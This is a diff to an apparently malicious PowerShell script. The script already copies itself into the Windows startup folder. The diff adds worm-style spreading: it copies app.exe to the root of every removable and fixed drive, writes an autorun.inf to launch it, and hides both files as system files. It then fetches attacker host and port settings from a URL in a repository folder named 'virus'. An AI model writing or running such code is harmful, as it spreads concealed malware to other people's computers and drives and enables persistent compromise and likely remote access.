@@ -8,6 +8,40 @@ if ($PWD.Path -ne $startupFolder) {
     Copy-Item -Path $sourcePath -Destination $destinationPath -Force
 }
 
+$currentPath = (Get-Location).Path
+$currentDriveRoot = "$((Get-Location).Drive.Name):\"
+$isAtRoot = ($currentPath -eq $currentDriveRoot)
+
+$autorunContent = @"
+[autorun]
+open=app.exe
+action=Start App
+shell\open\command=app.exe
+icon=app.exe,0
+label=App
+"@
+
+$usedDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -or $_.DriveType -eq 3 } | Select-Object -ExpandProperty DeviceID
+
+foreach ($driveId in $usedDrives) {
+    $targetDriveRoot = "$driveId\"
+    
+    if ($isAtRoot -and ($targetDriveRoot -eq $currentDriveRoot)) { continue }
+
+    try {
+        Copy-Item -Path "app.exe" -Destination "$($targetDriveRoot)app.exe" -Force -ErrorAction Stop
+        
+        $autorunPath = "$($targetDriveRoot)autorun.inf"
+        $autorunContent | Set-Content -Path $autorunPath -Encoding ASCII -Force
+        
+        (Get-Item "$($targetDriveRoot)app.exe").Attributes = 'Hidden', 'System'
+        (Get-Item $autorunPath).Attributes = 'Hidden', 'System'        
+    }
+    catch {
+        Write-Warning "Skipped $targetDriveRoot : $($_.Exception.Message)"
+    }
+}
+
 $url = "https://raw.githubusercontent.com/WaxArsatia/Random/refs/heads/main/virus/lhostlport.txt"
 $configText = Invoke-RestMethod -Uri $url
 
